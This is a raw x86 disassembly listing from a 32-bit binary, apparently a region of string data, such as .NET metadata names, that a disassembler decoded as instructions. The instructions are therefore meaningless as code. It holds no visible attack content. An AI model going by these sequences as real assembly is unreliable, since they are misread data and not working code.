  407997:	bound  ecx,QWORD PTR [esi+0x61]
  40799a:	ins    DWORD PTR es:[edi],dx
  40799b:	add    BYTE PTR gs:[esp+ebp*2+0x62],dl
  4079a0:	add    BYTE PTR [ebx+0x79],dl
  4079a3:	jae    0x407a19
  4079a5:	gs ins DWORD PTR es:[edi],dx
  4079a7:	cs push edx
  4079a9:	gs data16 ins BYTE PTR es:[edi],dx
  4079ac:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4079b1:	outs   dx,BYTE PTR ds:[esi]
  4079b2:	add    BYTE PTR [ecx+0x73],al
  4079b5:	jae    0x407a1c
  4079b7:	ins    DWORD PTR es:[edi],dx
  4079b8:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4079bc:	inc    esp
  4079bd:	outs   dx,DWORD PTR ds:[esi]
  4079be:	inc    ebp
  4079bf:	js     0x407a31
  4079c1:	outs   dx,DWORD PTR ds:[esi]
  4079c2:	jb     0x407a38
  4079c4:	add    BYTE PTR [edx+0x65],dl
  4079c7:	addr16 dec ebx
  4079c9:	imul   ebp,DWORD PTR [esi+0x64],0x6d6f7246
  4079d0:	dec    edi
  4079d1:	jo     0x407a47
  4079d3:	imul   ebp,DWORD PTR [edi+0x6e],0x67616c46
  4079da:	jae    0x4079dc
  4079dc:	dec    esp
  4079dd:	outs   dx,DWORD PTR ds:[esi]
  4079de:	popa   
  4079df:	fs inc ebp
  4079e1:	ins    DWORD PTR es:[edi],dx
  4079e2:	bound  esp,QWORD PTR [ebp+0x64]
  4079e5:	fs gs fs push esp
  4079e9:	ins    BYTE PTR es:[edi],dx
  4079ea:	bound  eax,QWORD PTR [eax]
  4079ec:	push   ebx
  4079ed:	gs je  0x407a45
  4079f0:	jo     0x407a44
  4079f2:	gs push sp
  4079f5:	ins    BYTE PTR es:[edi],dx
  4079f6:	bound  ecx,QWORD PTR [ecx+0x6e]
  4079f9:	outs   dx,WORD PTR ds:[esi]
  4079fb:	add    BYTE PTR [edi+0x65],al
  4079fe:	je     0x407a52
  407a00:	gs push sp
  407a03:	ins    BYTE PTR es:[edi],dx
  407a04:	bound  ecx,QWORD PTR [ecx+0x6e]
  407a07:	outs   dx,WORD PTR ds:[esi]
  407a09:	add    BYTE PTR [edi+ebp*2+0x61],cl
  407a0d:	fs push edx
  407a0f:	gs push sp
  407a12:	ins    BYTE PTR es:[edi],dx
  407a13:	bound  eax,QWORD PTR [eax]
  407a15:	dec    ecx
  407a16:	jae    0x407a5b
  407a18:	jb     0x407a89
  407a1a:	jae    0x407a8f
  407a1c:	inc    ebx
  407a1d:	outs   dx,DWORD PTR ds:[esi]
  407a1e:	ins    DWORD PTR es:[edi],dx
  407a1f:	jo     0x407a8a
  407a21:	ins    BYTE PTR es:[edi],dx
  407a22:	add    BYTE PTR gs:[ecx+0x73],cl
  407a26:	push   eax
  407a27:	jne    0x407a9b
  407a29:	gs inc ebx
  407a2b:	jb     0x407a9c
  407a2d:	jae    0x407aa2
  407a2f:	inc    ebx
  407a30:	outs   dx,DWORD PTR ds:[esi]
  407a31:	ins    DWORD PTR es:[edi],dx
  407a32:	jo     0x407a9d
  407a34:	ins    BYTE PTR es:[edi],dx
  407a35:	add    BYTE PTR gs:[ebp+0x78],al
  407a39:	jo     0x407aaa
  407a3b:	jb     0x407ab1
  407a3d:	inc    ecx
  407a3e:	jae    0x407a76
  407a40:	xor    al,0x42
  407a42:	imul   esi,DWORD PTR [eax+eax*1+0x45],0x726f7078
  407a4a:	je     0x407a8d
  407a4c:	jae    0x407a81
  407a4e:	xor    al,BYTE PTR [edx+0x69]
  407a51:	je     0x407a53
  407a53:	inc    ebp
  407a54:	js     0x407ab9
  407a56:	gs jo  0x407acd
  407a59:	imul   ebp,DWORD PTR [edi+0x6e],0x72685400
  407a60:	outs   dx,DWORD PTR ds:[esi]
  407a61:	ja     0x407aa4
  407a63:	jo     0x407ad5
  407a65:	inc    ebp
  407a66:	js     0x407acb
  407a68:	gs jo  0x407adf
  407a6b:	imul   ebp,DWORD PTR [edi+0x6e],0x616f4c00
  407a72:	fs push esp
  407a74:	jns    0x407ae6
  407a76:	gs dec esp
  407a78:	imul   esp,DWORD PTR [edx+0x45],0x6f4c0078
  407a7f:	popa   
  407a80:	fs push esp
  407a82:	jns    0x407af4
  407a84:	gs dec esp
  407a86:	imul   esp,DWORD PTR [edx+0x57],0x52687469
  407a8d:	gs jae 0x407aff
  407a90:	ins    BYTE PTR es:[edi],dx
  407a91:	jbe    0x407af8
  407a93:	jb     0x407a95
  407a95:	inc    edi
  407a96:	gs je  0x407aed
  407a99:	jns    0x407b0b
  407a9b:	gs dec esp
  407a9d:	imul   esp,DWORD PTR [edx+0x49],0x6f666e
  407aa4:	push   ebx
  407aa5:	jns    0x407b1a
  407aa7:	je     0x407b0e
  407aa9:	ins    DWORD PTR es:[edi],dx
  407aaa:	cs inc ebx
  407aac:	outs   dx,DWORD PTR ds:[esi]
  407aad:	ins    BYTE PTR es:[edi],dx
  407aae:	ins    BYTE PTR es:[edi],dx
  407aaf:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407ab4:	outs   dx,BYTE PTR ds:[esi]
  407ab5:	jae    0x407ab7
  407ab7:	dec    eax
  407ab8:	popa   
  407ab9:	jae    0x407b23
  407abb:	je     0x407b1e
  407abd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  407ac1:	jae    0x407b22
  407ac3:	push   esp
  407ac4:	jns    0x407b36
  407ac6:	gs dec esp
  407ac8:	imul   esp,DWORD PTR [edx+0x72],0x65697261
  407acf:	jae    0x407ad1
  407ad1:	jae    0x407b32
  407ad3:	push   edx
  407ad4:	gs jae 0x407b46
  407ad7:	ins    BYTE PTR es:[edi],dx
  407ad8:	jbe    0x407b3f
  407ada:	jb     0x407adc
  407adc:	push   edx
  407add:	gs jae 0x407b4f
  407ae0:	ins    BYTE PTR es:[edi],dx
  407ae1:	jbe    0x407b48
  407ae3:	push   esp
  407ae4:	jns    0x407b56
  407ae6:	gs dec esp
  407ae8:	imul   esp,DWORD PTR [edx+0x0],0x736c5f6d
  407aef:	je     0x407b41
  407af1:	popa   
  407af2:	je     0x407b5c
  407af4:	jae    0x407af6
  407af6:	push   edx
  407af7:	gs jae 0x407b69
  407afa:	ins    BYTE PTR es:[edi],dx
  407afb:	jbe    0x407b62
  407afd:	inc    ebp
  407afe:	jbe    0x407b65
  407b00:	outs   dx,BYTE PTR ds:[esi]
  407b01:	je     0x407b44
  407b03:	jb     0x407b6c
  407b05:	jae    0x407b07
  407b07:	push   edx
  407b08:	gs jae 0x407b7a
  407b0b:	ins    BYTE PTR es:[edi],dx
  407b0c:	jbe    0x407b73
  407b0e:	inc    ecx
  407b0f:	jae    0x407b84
  407b11:	gs ins DWORD PTR es:[edi],dx
  407b13:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407b17:	inc    ebx
  407b18:	jb     0x407b7f
  407b1a:	popa   
  407b1b:	je     0x407b82
  407b1d:	push   esp
  407b1e:	jns    0x407b90
  407b20:	gs dec ecx
  407b22:	outs   dx,BYTE PTR ds:[esi]
  407b23:	outs   dx,WORD PTR ds:[esi]
  407b25:	add    BYTE PTR [ebx+0x65],dl
  407b28:	je     0x407b78
  407b2a:	popa   
  407b2b:	ins    DWORD PTR es:[edi],dx
  407b2c:	add    BYTE PTR gs:[ebx+0x65],dl
  407b30:	je     0x407b88
  407b32:	gs jb  0x407ba8
  407b35:	imul   ebp,DWORD PTR [edi+0x6e],0x74655300
  407b3c:	inc    edi
  407b3d:	jne    0x407ba8
  407b3f:	add    BYTE PTR fs:[ebx+0x65],dl
  407b43:	je     0x407b89
  407b45:	outs   dx,DWORD PTR ds:[esi]
  407b46:	arpl   WORD PTR [ebx+0x74],dx
  407b49:	jb     0x407bb4
  407b4b:	outs   dx,BYTE PTR ds:[esi]
  407b4c:	add    BYTE PTR [bp+di+0x65],dl
  407b50:	je     0x407b9a
  407b52:	gs ins BYTE PTR es:[edi],dx
  407b54:	jo     0x407b9c
  407b56:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407b5e:	push   ebx
  407b5f:	gs je  0x407baa
  407b62:	gs ins BYTE PTR es:[edi],dx
  407b64:	jo     0x407ba9
  407b66:	outs   dx,DWORD PTR ds:[esi]
  407b67:	outs   dx,BYTE PTR ds:[esi]
  407b68:	je     0x407bcf
  407b6a:	js     0x407be0
  407b6c:	add    BYTE PTR [ebx+0x65],dl
  407b6f:	je     0x407bbd
  407b71:	arpl   WORD PTR [ecx+0x64],bp
  407b74:	add    BYTE PTR [ebx+0x65],dl
  407b77:	je     0x407bc5
  407b79:	imul   esp,DWORD PTR [edx+0x46],0x7367616c
  407b80:	add    BYTE PTR [ebx+0x61],dl
  407b83:	jbe    0x407bea
  407b85:	inc    ecx
  407b86:	ins    BYTE PTR es:[edi],dx
  407b87:	ins    BYTE PTR es:[edi],dx
  407b88:	inc    ebx
  407b89:	push   0x65676e61
  407b8e:	jae    0x407b90
  407b90:	inc    ebp
  407b91:	js     0x407c03
  407b93:	outs   dx,DWORD PTR ds:[esi]
  407b94:	jb     0x407c0a
  407b96:	gs jb  0x407bde
  407b99:	jbe    0x407c00
  407b9b:	outs   dx,BYTE PTR ds:[esi]
  407b9c:	je     0x407be9
  407b9e:	imul   ebp,DWORD PTR [esi+0x64],0x70655200
  407ba5:	outs   dx,DWORD PTR ds:[esi]
  407ba6:	jb     0x407c1c
  407ba8:	inc    ebp
  407ba9:	jbe    0x407c10
  407bab:	outs   dx,BYTE PTR ds:[esi]
  407bac:	je     0x407bae
  407bae:	push   edx
  407baf:	gs jae 0x407c21
  407bb2:	ins    BYTE PTR es:[edi],dx
  407bb3:	jbe    0x407c1a
  407bb5:	push   edx
  407bb6:	data16 add BYTE PTR gs:[edi+0x65],al
  407bbb:	je     0x407c0b
  407bbd:	popa   
  407bbe:	ins    DWORD PTR es:[edi],dx
  407bbf:	gs jae 0x407bc2
  407bc2:	ins    DWORD PTR es:[edi],dx
  407bc3:	pop    edi
  407bc4:	jae    0x407c3a
  407bc6:	jb     0x407c09
  407bc8:	jae    0x407c3d
  407bca:	gs ins DWORD PTR es:[edi],dx
  407bcc:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  407bd0:	popa   
  407bd1:	ins    DWORD PTR es:[edi],dx
  407bd2:	add    BYTE PTR gs:[ebp+0x5f],ch
  407bd6:	jae    0x407c4c
  407bd8:	jb     0x407c2e
  407bda:	jns    0x407c4c
  407bdc:	gs dec esp
  407bde:	imul   esp,DWORD PTR [edx+0x4e],0x656d61
  407be5:	ins    DWORD PTR es:[edi],dx
  407be6:	pop    edi
  407be7:	jae    0x407c5d
  407be9:	jb     0x407c3a
  407beb:	jne    0x407c61
  407bed:	jo     0x407c64
  407bef:	je     0x407c35
  407bf1:	imul   esi,DWORD PTR [edx+0x0],0x74735f6d
  407bf8:	jb     0x407c48
  407bfa:	popa   
  407bfb:	ins    DWORD PTR es:[edi],dx
  407bfc:	gs jae 0x407c45
  407bff:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407c07:	ins    DWORD PTR es:[edi],dx
  407c08:	pop    edi
  407c09:	jae    0x407c7f
  407c0b:	jb     0x407c61
  407c0d:	ins    BYTE PTR es:[edi],dx
  407c0e:	bound  edx,QWORD PTR [edx+0x65]
  407c11:	data16 jae 0x407c14
  407c14:	ins    DWORD PTR es:[edi],dx
  407c15:	pop    edi
  407c16:	jae    0x407c8c
  407c18:	jb     0x407c6e
  407c1a:	ins    BYTE PTR es:[edi],dx
  407c1b:	bound  edx,QWORD PTR [edx+0x65]
  407c1e:	push   ax
  407c20:	popa   
  407c21:	je     0x407c8b
  407c23:	jae    0x407c25
  407c25:	ins    DWORD PTR es:[edi],dx
  407c26:	pop    edi
  407c27:	jae    0x407c9d
  407c29:	jb     0x407c6c
  407c2b:	jae    0x407c9a
  407c2d:	push   eax
  407c2e:	popa   
  407c2f:	je     0x407c99
  407c31:	add    BYTE PTR [ebp+0x5f],ch
  407c34:	bound  ecx,QWORD PTR [esi+0x6f]
  407c37:	dec    esp
  407c38:	outs   dx,DWORD PTR ds:[esi]
  407c39:	outs   dx,DWORD PTR ds:[si]
  407c3b:	add    BYTE PTR [ebp+0x5f],ch
  407c3e:	bound  edx,QWORD PTR [ebx+0x69]
  407c41:	ins    BYTE PTR es:[edi],dx
  407c42:	outs   dx,BYTE PTR gs:[esi]
  407c44:	je     0x407c93
  407c46:	outs   dx,DWORD PTR ds:[esi]
  407c47:	fs add BYTE PTR gs:[ebp+0x5f],ch
  407c4c:	bound  edx,QWORD PTR [esi+0x65]
  407c4f:	jb     0x407cb3
  407c51:	outs   dx,DWORD PTR ds:[esi]
  407c52:	jae    0x407cb9
  407c54:	dec    ebp
  407c55:	outs   dx,DWORD PTR ds:[esi]
  407c56:	fs add BYTE PTR gs:[ebp+0x5f],ch
  407c5b:	data16 ins BYTE PTR es:[edi],dx
  407c5d:	popa   
  407c5e:	addr16 jae 0x407c61
  407c61:	push   edi
  407c62:	jb     0x407ccd
  407c64:	je     0x407ccb
  407c66:	inc    ebp
  407c67:	jb     0x407cdb
  407c69:	outs   dx,DWORD PTR ds:[esi]
  407c6a:	jb     0x407c6c
  407c6c:	push   edi
  407c6d:	jb     0x407cd8
  407c6f:	je     0x407cd6
  407c71:	push   edi
  407c72:	popa   
  407c73:	jb     0x407ce3
  407c75:	imul   ebp,DWORD PTR [esi+0x67],0x69725700
  407c7c:	je     0x407ce3
  407c7e:	dec    ecx
  407c7f:	outs   dx,BYTE PTR ds:[esi]
  407c80:	outs   dx,WORD PTR ds:[esi]
  407c82:	add    BYTE PTR [ebx+0x65],dl
  407c85:	je     0x407cda
  407c87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x5f730074
  407c8f:	bound  edx,QWORD PTR [ebx+0x69]
  407c92:	ins    BYTE PTR es:[edi],dx
  407c93:	outs   dx,BYTE PTR gs:[esi]
  407c95:	je     0x407c97
  407c97:	imul   esp,DWORD PTR [ebp+0x79],0x0
  407c9b:	popa   
  407c9c:	xor    DWORD PTR [eax],eax
  407c9e:	popa   
  407c9f:	xor    al,BYTE PTR [eax]
  407ca1:	popa   
  407ca2:	xor    eax,DWORD PTR [eax]
  407ca4:	popa   
  407ca5:	xor    al,0x0
  407ca7:	popa   
  407ca8:	xor    eax,0x366100
  407cad:	popa   
  407cae:	inc    ecx
  407caf:	jb     0x407d18
  407cb1:	jae    0x407cb3
  407cb3:	inc    esi
  407cb4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407cbc:	jb     0x407d23
  407cbe:	ins    BYTE PTR es:[edi],dx
  407cbf:	push   eax
  407cc0:	popa   
  407cc1:	je     0x407d2b
  407cc3:	add    BYTE PTR [edi+0x70],cl
  407cc6:	je     0x407d31
  407cc8:	outs   dx,DWORD PTR ds:[esi]
  407cc9:	outs   dx,BYTE PTR ds:[esi]
  407cca:	jae    0x407ccc
  407ccc:	push   edx
  407ccd:	gs je  0x407d45
  407cd0:	jb     0x407d40
  407cd2:	inc    ebx
  407cd3:	outs   dx,DWORD PTR ds:[esi]
  407cd4:	fs add BYTE PTR gs:[eax+0x61],dh
  407cd9:	je     0x407d43
  407cdb:	add    BYTE PTR [esi+0x69],ah
  407cde:	ins    BYTE PTR es:[edi],dx
  407cdf:	gs dec esi
  407ce1:	popa   
  407ce2:	ins    DWORD PTR es:[edi],dx
  407ce3:	add    BYTE PTR gs:[ebp+0x78],ah
  407ce7:	je     0x407d4e
  407ce9:	outs   dx,BYTE PTR ds:[esi]
  407cea:	jae    0x407d55
  407cec:	outs   dx,DWORD PTR ds:[esi]
  407ced:	outs   dx,BYTE PTR ds:[esi]
  407cee:	add    BYTE PTR [esi+0x75],ch
  407cf1:	ins    DWORD PTR es:[edi],dx
  407cf2:	inc    edx
  407cf3:	jne    0x407d5b
  407cf5:	data16 gs jb 0x407d3c
  407cf9:	push   0x737261
  407cfe:	bound  esi,QWORD PTR [ebp+0x66]
  407d01:	data16 gs jb 0x407d05
  407d05:	imul   bp,WORD PTR [ebp+eiz*2+0x50],0x7261
  407d0c:	je     0x407d0e
  407d0e:	jae    0x407d8a
  407d10:	dec    esi
  407d11:	popa   
  407d12:	ins    DWORD PTR es:[edi],dx
  407d13:	add    BYTE PTR gs:[ebx+0x7a],dh
  407d17:	push   esi
  407d18:	popa   
  407d19:	ins    BYTE PTR es:[edi],dx
  407d1a:	jne    0x407d81
  407d1c:	add    BYTE PTR [ebx+0x74],dh
  407d1f:	jb     0x407d6f
  407d21:	popa   
  407d22:	ins    DWORD PTR es:[edi],dx
  407d23:	add    BYTE PTR gs:[ebx+0x74],dh
  407d27:	jb     0x407d7f
  407d29:	popa   
  407d2a:	ins    BYTE PTR es:[edi],dx
  407d2b:	jne    0x407d92
  407d2d:	add    BYTE PTR [ecx+0x4f],ah
  407d30:	jo     0x407da6
  407d32:	imul   ebp,DWORD PTR [edi+0x6e],0x74730073
  407d39:	jb     0x407d8a
  407d3b:	jo     0x407db1
  407d3d:	add    BYTE PTR [edx+0x52],ah
  407d40:	gs jno 0x407db8
  407d43:	imul   esi,DWORD PTR [edx+0x65],0x6c615673
  407d4a:	jne    0x407db1
  407d4c:	add    BYTE PTR [edi+0x75],cl
  407d4f:	je     0x407d92
  407d51:	je     0x407dc7
  407d53:	jb     0x407dbe
  407d55:	bound  esi,QWORD PTR [ebp+0x74]
  407d58:	add    BYTE PTR gs:[edx+0x43],ah
  407d5c:	popa   
  407d5d:	outs   dx,BYTE PTR ds:[esi]
  407d5e:	dec    eax
  407d5f:	popa   
  407d60:	jbe    0x407dc7
  407d62:	push   esi
  407d63:	popa   
  407d64:	ins    BYTE PTR es:[edi],dx
  407d65:	jne    0x407dcc
  407d67:	add    BYTE PTR [ecx+0x56],ah
  407d6a:	popa   
  407d6b:	ins    BYTE PTR es:[edi],dx
  407d6c:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x73007374
  407d74:	je     0x407de8
  407d76:	inc    ecx
  407d77:	jae    0x407dec
  407d79:	gs ins DWORD PTR es:[edi],dx
  407d7b:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  407d7f:	popa   
  407d80:	ins    DWORD PTR es:[edi],dx
  407d81:	add    BYTE PTR gs:[ebx+0x74],dh
  407d85:	jb     0x407ddb
  407d87:	jns    0x407df9
  407d89:	gs dec esp
  407d8b:	imul   esp,DWORD PTR [edx+0x4e],0x656d61
  407d92:	jae    0x407e08
  407d94:	jb     0x407de5
  407d96:	jne    0x407e0c
  407d98:	jo     0x407e0f
  407d9a:	je     0x407de0
  407d9c:	imul   esi,DWORD PTR [edx+0x0],0x4e727473
  407da3:	popa   
  407da4:	ins    DWORD PTR es:[edi],dx
  407da5:	gs jae 0x407dee
  407da8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407db0:	jae    0x407e26
  407db2:	jb     0x407e08
  407db4:	ins    BYTE PTR es:[edi],dx
  407db5:	bound  edx,QWORD PTR [edx+0x65]
  407db8:	data16 jae 0x407dbb
  407dbb:	jae    0x407e31
  407dbd:	jb     0x407e13
  407dbf:	ins    BYTE PTR es:[edi],dx
  407dc0:	bound  edx,QWORD PTR [edx+0x65]
  407dc3:	push   ax
  407dc5:	popa   
  407dc6:	je     0x407e30
  407dc8:	jae    0x407dca
  407dca:	jae    0x407e40
  407dcc:	jb     0x407e0f
  407dce:	jae    0x407e3d
  407dd0:	push   eax
  407dd1:	popa   
  407dd2:	je     0x407e3c
  407dd4:	add    BYTE PTR [edx+0x4e],ah
  407dd7:	outs   dx,DWORD PTR ds:[esi]
  407dd8:	dec    esp
  407dd9:	outs   dx,DWORD PTR ds:[esi]
  407dda:	outs   dx,DWORD PTR ds:[si]
  407ddc:	add    BYTE PTR [edx+0x53],ah
  407ddf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x646f4d74
  407de7:	add    BYTE PTR gs:[edx+0x56],ah
  407deb:	gs jb  0x407e50
  407dee:	outs   dx,DWORD PTR ds:[esi]
  407def:	jae    0x407e56
  407df1:	dec    ebp
  407df2:	outs   dx,DWORD PTR ds:[esi]
  407df3:	fs add BYTE PTR gs:[esi+0x6c],ah
  407df8:	popa   
  407df9:	addr16 jae 0x407dfc
  407dfc:	outs   dx,DWORD PTR ds:[esi]
  407dfd:	add    BYTE PTR [esi+0x61],dh
  407e00:	ins    BYTE PTR es:[edi],dx
  407e01:	jne    0x407e68
  407e03:	add    BYTE PTR [edi+0x70],ch
  407e06:	je     0x407e71
  407e08:	outs   dx,DWORD PTR ds:[esi]
  407e09:	outs   dx,BYTE PTR ds:[esi]
  407e0a:	jae    0x407e0c
  407e0c:	popa   
  407e0d:	jae    0x407e7c
  407e0f:	add    BYTE PTR [ebx+0x74],dh
  407e12:	jb     0x407e5a
  407e14:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407e1c:	je     0x407e8a
  407e1e:	bound  ecx,QWORD PTR [esi+0x61]
  407e21:	ins    DWORD PTR es:[edi],dx
  407e22:	add    BYTE PTR gs:[ebx+0x74],dh
  407e26:	jb     0x407e78
  407e28:	jb     0x407e8f
  407e2a:	imul   di,WORD PTR [eax+0x0],0x65
  407e30:	jb     0x407e97
  407e32:	addr16 dec ebx
  407e34:	imul   ebp,DWORD PTR [esi+0x64],0x70797400
  407e3b:	gs ins BYTE PTR es:[edi],dx
  407e3d:	imul   esp,DWORD PTR [edx+0x0],0x6f736572
  407e44:	ins    BYTE PTR es:[edi],dx
  407e45:	jbe    0x407eac
  407e47:	jb     0x407e49
  407e49:	jo     0x407e9f
  407e4b:	jns    0x407ebd
  407e4d:	gs dec esp
  407e4f:	imul   esp,DWORD PTR [edx+0x49],0x54700044
  407e56:	jns    0x407ec8
  407e58:	gs dec esp
  407e5a:	imul   esp,DWORD PTR [edx+0x4c],0x444943
  407e61:	jo     0x407eb7
  407e63:	jns    0x407ed5
  407e65:	gs dec esp
  407e67:	imul   esp,DWORD PTR [edx+0x50],0x6674616c
  407e6e:	outs   dx,DWORD PTR ds:[esi]
  407e6f:	jb     0x407ede
  407e71:	add    BYTE PTR [eax+0x54],dh
  407e74:	jns    0x407ee6
  407e76:	gs dec esp
  407e78:	imul   esp,DWORD PTR [edx+0x4d],0x726f6a61
  407e7f:	push   esi
  407e80:	gs jb  0x407e83
  407e83:	jo     0x407ed9
  407e85:	jns    0x407ef7
  407e87:	gs dec esp
  407e89:	imul   esp,DWORD PTR [edx+0x4d],0x726f6e69
  407e90:	push   esi
  407e91:	gs jb  0x407e94
  407e94:	bound  esi,QWORD PTR [ebx+0x74]
  407e97:	jb     0x407eec
  407e99:	imul   ebp,DWORD PTR [ebp+0x70],0x614e656c
  407ea0:	ins    DWORD PTR es:[edi],dx
  407ea1:	add    BYTE PTR gs:[ebx+eiz*2+0x69],ch
  407ea6:	add    BYTE PTR fs:[edi+0x4d],dh
  407eaa:	popa   
  407eab:	push   0x6f
  407ead:	jb     0x407f05
  407eaf:	gs jb  0x407f25
  407eb2:	imul   ebp,DWORD PTR [edi+0x6e],0x694d7700
  407eb9:	outs   dx,BYTE PTR ds:[esi]
  407eba:	outs   dx,DWORD PTR ds:[esi]
  407ebb:	jb     0x407f13
  407ebd:	gs jb  0x407f33
  407ec0:	imul   ebp,DWORD PTR [edi+0x6e],0x73797300
  407ec7:	imul   ebp,DWORD PTR [ecx+0x6e],0x64
  407ecb:	add    BYTE PTR [ecx+0x73],ah
  407ece:	ins    DWORD PTR es:[edi],dx
  407ecf:	jo     0x407f32
  407ed1:	je     0x407f3b
  407ed3:	jae    0x407ed5
  407ed5:	jae    0x407f3c
  407ed7:	outs   dx,BYTE PTR ds:[esi]
  407ed8:	fs gs jb 0x407edc
  407edc:	popa   
  407edd:	jb     0x407f46
  407edf:	jae    0x407ee1
  407ee1:	inc    ebp
  407ee2:	jbe    0x407f49
  407ee4:	outs   dx,BYTE PTR ds:[esi]
  407ee5:	je     0x407f32
  407ee7:	imul   ebp,DWORD PTR [esi+0x64],0x65764500
  407eee:	outs   dx,BYTE PTR ds:[esi]
  407eef:	je     0x407f34
  407ef1:	outs   dx,DWORD PTR ds:[esi]
  407ef2:	fs add BYTE PTR gs:[ebp+0x76],al
  407ef7:	outs   dx,BYTE PTR gs:[esi]
  407ef9:	je     0x407f48
  407efb:	jae    0x407f64
  407efd:	add    BYTE PTR [ebp+0x65],ch
  407f00:	jae    0x407f75
  407f02:	popa   
  407f03:	add    BYTE PTR gs:[di+0x72],ah
  407f08:	jb     0x407f79
  407f0a:	jb     0x407f5a
  407f0c:	jne    0x407f7b
  407f0e:	bound  esp,QWORD PTR [ebp+0x72]
  407f11:	add    BYTE PTR [ecx+ebp*2+0x6e],ch
  407f15:	add    BYTE PTR gs:[ebx+0x6f],ah
  407f19:	ins    BYTE PTR es:[edi],dx
  407f1a:	jne    0x407f89
  407f1c:	outs   dx,BYTE PTR ds:[esi]
  407f1d:	add    BYTE PTR [edi+0x61],dh
  407f20:	jb     0x407f90
  407f22:	imul   ebp,DWORD PTR [esi+0x67],0x626d754e
  407f29:	gs jb  0x407f2c
  407f2c:	jae    0x407f97
  407f2e:	ins    BYTE PTR es:[edi],dx
  407f2f:	outs   dx,BYTE PTR gs:[esi]
  407f31:	je     0x407f33
  407f33:	inc    ebx
  407f34:	outs   dx,DWORD PTR ds:[esi]
  407f35:	ins    DWORD PTR es:[edi],dx
  407f36:	push   esi
  407f37:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  407f3e:	je     0x407fb4
  407f40:	jb     0x407fab
  407f42:	bound  esi,QWORD PTR [ebp+0x74]
  407f45:	add    BYTE PTR gs:[ebx+0x4c],al
  407f49:	push   ebx
  407f4a:	inc    ebx
  407f4b:	outs   dx,DWORD PTR ds:[esi]
  407f4c:	ins    DWORD PTR es:[edi],dx
  407f4d:	jo     0x407fbb
  407f4f:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  407f56:	jb     0x407fc1
  407f58:	bound  esi,QWORD PTR [ebp+0x74]
  407f5b:	add    BYTE PTR gs:[ecx+0x73],al
  407f5f:	jae    0x407fc6
  407f61:	ins    DWORD PTR es:[edi],dx
  407f62:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  407f66:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  407f6e:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407f75:	jae    0x407fea
  407f77:	gs ins DWORD PTR es:[edi],dx
  407f79:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  407f7d:	gs jae 0x407fe3
  407f80:	jb     0x407feb
  407f82:	jo     0x407ff8
  407f84:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407f8b:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407f92:	jae    0x408007
  407f94:	gs ins DWORD PTR es:[edi],dx
  407f96:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  407f9a:	gs popaw 
  407f9d:	jne    0x40800b
  407f9f:	je     0x407fe2
  407fa1:	ins    BYTE PTR es:[edi],dx
  407fa2:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  407fa9:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407fb0:	jae    0x408025
  407fb2:	gs ins DWORD PTR es:[edi],dx
  407fb4:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  407fb8:	outs   dx,DWORD PTR ds:[esi]
  407fb9:	ins    DWORD PTR es:[edi],dx
  407fba:	jo     0x40801d
  407fbc:	outs   dx,BYTE PTR ds:[esi]
  407fbd:	jns    0x408000
  407fbf:	je     0x408035
  407fc1:	jb     0x40802c
  407fc3:	bound  esi,QWORD PTR [ebp+0x74]
  407fc6:	add    BYTE PTR gs:[ecx+0x73],al
  407fca:	jae    0x408031
  407fcc:	ins    DWORD PTR es:[edi],dx
  407fcd:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  407fd1:	jb     0x408042
  407fd3:	fs jne 0x408039
  407fd6:	je     0x408019
  407fd8:	je     0x40804e
  407fda:	jb     0x408045
  407fdc:	bound  esi,QWORD PTR [ebp+0x74]
  407fdf:	add    BYTE PTR gs:[ecx+0x73],al
  407fe3:	jae    0x40804a
  407fe5:	ins    DWORD PTR es:[edi],dx
  407fe6:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  407fea:	outs   dx,DWORD PTR ds:[esi]
  407feb:	jo     0x408066
  407fed:	jb     0x408058
  407fef:	addr16 push 0x74744174
  407ff5:	jb     0x408060
  407ff7:	bound  esi,QWORD PTR [ebp+0x74]
  407ffa:	add    BYTE PTR gs:[ecx+0x73],al
  407ffe:	jae    0x408065
  408000:	ins    DWORD PTR es:[edi],dx
  408001:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  408005:	gs jb  0x40807b
  408008:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40800f:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  408016:	jae    0x40808b
  408018:	gs ins DWORD PTR es:[edi],dx
  40801a:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  40801e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  408026:	outs   dx,DWORD PTR ds:[esi]
  408027:	outs   dx,BYTE PTR ds:[esi]
  408028:	inc    ecx
  408029:	je     0x40809f
  40802b:	jb     0x408096
  40802d:	bound  esi,QWORD PTR [ebp+0x74]
  408030:	add    BYTE PTR gs:[ecx+0x73],al
  408034:	jae    0x40809b
  408036:	ins    DWORD PTR es:[edi],dx
  408037:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
